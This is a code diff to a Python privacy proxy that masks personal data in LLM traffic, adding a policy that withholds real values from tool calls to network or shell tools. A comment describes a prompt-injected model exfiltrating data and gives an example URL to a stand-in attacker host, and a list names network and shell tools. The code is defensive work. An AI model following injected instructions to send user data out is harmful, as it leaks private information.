@@ -26,7 +26,7 @@ Pieces
                 agents' file tools keep working; restore keeps the original case of every value.
 CLI: swapback stats | health | canary | scrub-file IN.json | check-config   (swapback --help)
 """
-import json, os, re, sys, threading, time, hashlib, tempfile
+import fnmatch, json, os, re, sys, threading, time, hashlib, tempfile
 
 L, R = "\u00ab", "\u00bb"
 TYPES = ("PRIVATE_FIGURE", "PRIVATE_TERM", "PERSON", "EMAIL", "PHONE", "ADDRESS", "SSN", "CARD", "IBAN", "ACCOUNT", "DOB",
@@ -94,6 +94,7 @@ def load_cfg(path=None):
     c["mode"] = "on" if m is True else "off" if m is False else str(m).strip().lower()   # YAML reads on/off as bools
     if c["mode"] not in ("off", "watch", "on"):
         raise ValueError("mode must be on, watch or off")
+    ToolPolicy(c.get("tool_restore", True))             # a bad tool_restore section fails here, at load
     return c
 
 
@@ -633,10 +634,12 @@ class Scrubber:
 
     # request -------------------------------------------------------
     SKIP_KEYS = {"model", "role", "type", "tool_call_id", "id", "tool_choice", "response_format", "stop", "format",
-                 "reasoning_effort", "service_tier", "user"}
+                 "reasoning_effort", "service_tier"}
 
-    def scrub_request(self, body, counts=None, forms=None):
-        """mutates and returns body; raises ScrubError on anything unexpected (fail closed). forms: see Forms."""
+    def scrub_request(self, body, counts=None, forms=None, api=None):
+        """mutates and returns body; raises ScrubError on anything unexpected (fail closed). forms: see Forms.
+        api: "chat" (default), "anthropic" (/v1/messages) or "responses" (/v1/responses); says where the
+        system note goes."""
         counts = {} if counts is None else counts
         left = [0]
 
@@ -675,10 +678,8 @@ class Scrubber:
                         raise ScrubError("token-id %s cannot be checked" % k)
             walk(body)
             note = self.cfg.get("system_note")
-            msgs = body.get("messages") if isinstance(body, dict) else None
-            if note and isinstance(msgs, list) and msgs and isinstance(msgs[0], dict) and msgs[0].get("role") == "system" \
-                    and isinstance(msgs[0].get("content"), str) and note not in msgs[0]["content"]:
-                msgs[0]["content"] += "\n\n" + note
+            if note and isinstance(body, dict):
+                add_system_note(body, note, api, swapped=any(v for v in counts.values() if isinstance(v, int)))
         except ScrubError:
             raise
         except Exception as e:
@@ -734,8 +735,32 @@ class Scrubber:
             text = BARE_RE.sub(rep2, text)
         return text
 
+    def tool_policy(self):
+        tr = self.cfg.get("tool_restore", True)
+        k = json.dumps(tr, sort_keys=True, default=str)
+        if getattr(self, "_tp_key", None) != k:
+            self._tp, self._tp_key = ToolPolicy(tr), k
+        return self._tp
+
+    def tool_keep(self, name, args, stats=None):
+        """True when this tool call keeps its placeholders (the restore policy, see ToolPolicy). Counts a kept call
+        that carries a placeholder as stats["tool_kept"]."""
+        raw = args if isinstance(args, str) else json.dumps(args, ensure_ascii=False)
+        pol = self.tool_policy()
+        keep = pol.decide(name, raw, self.restore_text(raw, js=True) if pol.keep_if_url else None)
+        if keep and stats is not None and self.has_placeholder(raw):
+            stats["tool_kept"] = stats.get("tool_kept", 0) + 1
+        return keep
+
+    def has_placeholder(self, text):
+        return bool(text) and bool(PH_RE.search(text) or JS_PH_RE.search(text) or
+                                   (self.cfg.get("restore_bare", True) and BARE_RE.search(text)))
+
     def restore_obj(self, o, stats=None, key=None, forms=None):
         if isinstance(o, dict):
+            tc = tool_call_args(o)
+            if tc is not None and self.tool_keep(tc[0], o[tc[1]], stats):
+                return {k: (v if k == tc[1] else self.restore_obj(v, stats, k, forms)) for k, v in o.items()}
             return {k: self.restore_obj(v, stats, k, forms) for k, v in o.items()}
         if isinstance(o, list):
             return [self.restore_obj(x, stats, key, forms) for x in o]
@@ -795,6 +820,192 @@ class StreamRestorer:
         return self.s.restore_text(b, self.js, self.stats, self.forms)
 
 
+# ---------------------------------------------------------------- tool-call restore policy
+# A tool call's arguments are run by your client, so restoring real values into them hands those values to whatever
+# the tool does. A prompt-injected model can ask a web or shell tool to send them out, e.g.
+# {"url": "https://evil.example/c?d=«EMAIL_1»"}. By default calls to network/shell-looking tools, and calls whose
+# arguments carry a URL, keep the placeholders. Configure with `tool_restore:` (see swapback.example.yaml).
+TOOL_RESTORE_DEFAULTS = {
+    "default": "restore",        # tools nothing below matches: restore (real values) or keep (placeholders)
+    "keep_if_url": True,         # keep placeholders when any argument is or contains a URL
+    "allow": [],                 # tool names that always get real values (glob: mcp__github__*)
+    "deny": [],                  # tool names that never get real values
+    "egress_names": ["fetch*", "http*", "curl", "wget", "web*", "brows*", "request*", "url*", "navigat*",
+                     "download*", "upload*", "exec*", "*shell", "bash", "sh", "zsh", "cmd", "terminal", "run", "ssh",
+                     "scp", "rsync", "git_push", "push", "email*", "mail", "send", "post", "message", "webhook*",
+                     "notify", "publish"],
+}
+URL_IN_TEXT = re.compile(r"(?i)(?:\b[a-z][a-z0-9+.-]{1,15}://|\bmailto:|\bwww\.[a-z0-9-]+\.|"
+                         r"\b(?:[a-z0-9-]+\.)+[a-z]{2,24}(?::\d+)?/)")
+
+
+def _name_tokens(name):
+    n = re.sub(r"([A-Z]+)([A-Z][a-z])", r"\1_\2", str(name or ""))
+    n = re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", n).lower()
+    return re.sub(r"[^a-z0-9]+", "_", n).strip("_")
+
+
+class ToolPolicy:
+    """decides, per tool call, whether the real values go back into its arguments. Order: deny, allow, default: keep,
+    an egress name, then keep_if_url on the arguments; otherwise restore. `tool_restore: false` restores every call
+    (the 0.2 behaviour)."""
+
+    def __init__(self, conf=True):
+        c = dict(TOOL_RESTORE_DEFAULTS)
+        if conf is False or (isinstance(conf, str) and conf.strip().lower() in ("off", "false", "restore")):
+            c.update(default="restore", keep_if_url=False, egress_names=[])
+        elif isinstance(conf, dict):
+            c.update({k: v for k, v in conf.items() if v is not None})
+        elif conf not in (True, None):
+            raise ValueError("tool_restore must be a mapping, true or false")
+        d = str(c.get("default")).strip().lower()
+        if d not in ("restore", "keep"):
+            raise ValueError("tool_restore.default must be restore or keep")
+        self.default, self.keep_if_url = d, bool(c.get("keep_if_url"))
+        lists = {}
+        for k in ("allow", "deny", "egress_names"):
+            v = c.get(k) or []
+            if isinstance(v, str):
+                v = [v]
+            if not isinstance(v, list):
+                raise ValueError("tool_restore.%s must be a list" % k)
+            lists[k] = [str(x).strip().lower() for x in v if str(x).strip()]
+        self.allow, self.deny = lists["allow"], lists["deny"]
+        self.egress = [re.compile(r"(?:^|_)" + "[a-z0-9]*".join(re.escape(_name_tokens(x)) for x in p.split("*"))
+                                  + r"(?:$|_)") for p in lists["egress_names"]]
+        self.counts = {"allow": len(self.allow), "deny": len(self.deny), "egress_names": len(self.egress)}
+
+    @staticmethod
+    def _listed(name, lst):
+        n = str(name or "").lower()
+        return any(fnmatch.fnmatchcase(n, p) for p in lst)
+
+    def by_name(self, name):
+        """'keep' or 'restore' when the name decides; None when it depends on the arguments."""
+        if self._listed(name, self.deny):
+            return "keep"
+        if self._listed(name, self.allow):
+            return "restore"
+        if self.default == "keep":
+            return "keep"
+        n = _name_tokens(name)
+        if n and any(rx.search(n) for rx in self.egress):
+            return "keep"
+        return None if self.keep_if_url else "restore"
+
+    def decide(self, name, raw, restored=None):
+        """True = keep placeholders. raw: the arguments as the model wrote them; restored: with values put back."""
+        r = self.by_name(name)
+        if r is None:
+            r = "keep" if (URL_IN_TEXT.search(raw or "") or (restored and URL_IN_TEXT.search(restored))) else "restore"
+        return r == "keep"
+
+
+def tool_call_args(o):
+    """(tool name, key of its arguments) when dict o is a tool call the client will run, else None. Shapes: OpenAI
+    chat `function` / legacy `function_call` and Responses `function_call` ({name, arguments}), Anthropic `tool_use`
+    ({name, input}), Responses `custom_tool_call` ({name, input}) and `local_shell_call` ({action})."""
+    t = o.get("type")
+    if isinstance(o.get("name"), str) and "arguments" in o:
+        return o["name"], "arguments"
+    if t in ("tool_use", "custom_tool_call") and "input" in o:
+        return str(o.get("name") or ""), "input"
+    if t == "local_shell_call" and "action" in o:
+        return "local_shell", "action"
+    return None
+
+
+def add_system_note(body, note, api=None, swapped=True):
+    """the "keep placeholders as written" note. Appended to an existing system prompt (OpenAI system/developer
+    message with string or list content, Anthropic top-level `system` string or blocks, Responses `instructions`);
+    when there is none, one is created, but only if this request carries placeholders."""
+    if api is None:
+        api = "anthropic" if "system" in body else "responses" if ("input" in body and "messages" not in body) else "chat"
+
+    def has(v):
+        if isinstance(v, str):
+            return note in v
+        if isinstance(v, list):
+            return any(isinstance(b, dict) and note in str(b.get("text") or "") for b in v)
+        return False
+
+    def extend(v):
+        if isinstance(v, str):
+            return v + "\n\n" + note if v else note
+        if isinstance(v, list):
+            return v + [{"type": "text", "text": note}]
+        return v
+    if api == "anthropic":
+        s = body.get("system")
+        if s and not has(s) and isinstance(s, (str, list)):
+            body["system"] = extend(s)
+        elif not s and swapped:
+            body["system"] = note
+        return
+    if api == "responses" or ("instructions" in body and "messages" not in body):
+        s = body.get("instructions")
+        if s and isinstance(s, str) and not has(s):
+            body["instructions"] = extend(s)
+        elif not s and swapped:
+            body["instructions"] = note
+        return
+    msgs = body.get("messages")
+    if not isinstance(msgs, list):
+        return
+    m0 = msgs[0] if msgs and isinstance(msgs[0], dict) else None
+    if m0 is not None and m0.get("role") in ("system", "developer"):
+        c = m0.get("content")
+        if isinstance(c, (str, list)) and c and not has(c):
+            m0["content"] = extend(c)
+        elif not c and swapped:
+            m0["content"] = note
+    elif swapped:
+        msgs.insert(0, {"role": "system", "content": note})
+
+
+class ToolArgsStream:
+    """streamed tool-call arguments under the restore policy (feed/flush like StreamRestorer). When the tool's name
+    decides, pieces are restored (or passed as written) as they arrive; when the decision needs the whole arguments
+    (keep_if_url), they are held and sent at the end of the call, restored or not."""
+
+    def __init__(self, scr, js=True, stats=None, forms=None, name=None):
+        self.s, self.stats, self.js = scr, stats, js
+        self.inner = StreamRestorer(scr, js, stats, forms)
+        self.name, self.mode, self.tried, self.done, self.raw = name or "", None, False, False, []
+
+    def add_name(self, piece):
+        if not self.tried and isinstance(piece, str):
+            self.name += piece
+
+    def feed(self, chunk):
+        if not chunk:
+            return chunk
+        self.raw.append(chunk)
+        if not self.tried:
+            self.tried = True
+            self.mode = self.s.tool_policy().by_name(self.name)
+        if self.mode is None:
+            return ""
+        return self.inner.feed(chunk) if self.mode == "restore" else chunk
+
+    def flush(self):
+        if self.done:
+            return ""
+        self.done = True
+        full = "".join(self.raw)
+        if self.mode is None:
+            if not full:
+                return ""
+            keep = self.s.tool_policy().decide(self.name, full, self.s.restore_text(full, self.js))
+            self.mode = "keep" if keep else "restore"
+            out = (self.inner.feed(full) + self.inner.flush()) if self.mode == "restore" else full
+        else:
+            out = self.inner.flush() if self.mode == "restore" else ""
+        if self.mode == "keep" and self.stats is not None and self.s.has_placeholder(full):
+            self.stats["tool_kept"] = self.stats.get("tool_kept", 0) + 1
+        return out
+
+
 def restore_sse_event(scr, ev, state):
     """ev = parsed chat.completion.chunk dict; state = per-stream dict of restorers. Mutates ev."""
     for ch in ev.get("choices") or []:
@@ -806,9 +1017,12 @@ def restore_sse_event(scr, ev, state):
                 d[f] = r.feed(d[f])
         for tc in d.get("tool_calls") or []:
             fn = tc.get("function") or {}
+            k = (i, "tc", tc.get("index", 0))
+            r = state.get(k)
+            if r is None:
+                r = state[k] = ToolArgsStream(scr, True, state.setdefault("_stats", {}), state.get("_forms"))
+            r.add_name(fn.get("name"))
             if isinstance(fn.get("arguments"), str):
-                r = state.setdefault((i, "tc", tc.get("index", 0)),
-                                     scr.stream_restorer(True, state.setdefault("_stats", {}), state.get("_forms")))
                 fn["arguments"] = r.feed(fn["arguments"])
         if ch.get("finish_reason"):
             _flush_choice(scr, ch, i, state)
@@ -857,6 +1071,8 @@ def restore_anthropic_event(scr, ev, state):
         cb = ev["content_block"]
         if cb.get("type") in ("text", "tool_use"):
             ev["content_block"] = scr.restore_obj(cb, stats, forms=forms)
+        if cb.get("type") == "tool_use":            # its input_json_delta pieces go through the restore policy
+            rs[ev.get("index", 0)] = ("input_json_delta", ToolArgsStream(scr, True, stats, forms, cb.get("name")))
         return []
     if t == "content_block_delta":
         d = ev.get("delta") or {}
@@ -1050,6 +1266,8 @@ def main(argv=None):
                           "vault": len(s.rev), "ctr": s.ctr}))
     elif cmd == "check-config":
         out = {"mode": cfg["mode"], "listen": cfg["listen"], "upstream": cfg["upstream"], "state_dir": state_dir(cfg)}
+        tp = ToolPolicy(cfg.get("tool_restore", True))
+        out["tool_restore"] = dict(default=tp.default, keep_if_url=tp.keep_if_url, **tp.counts)
         if cfg.get("known_file"):
             k = load_known(cfg["known_file"])
             by = {}
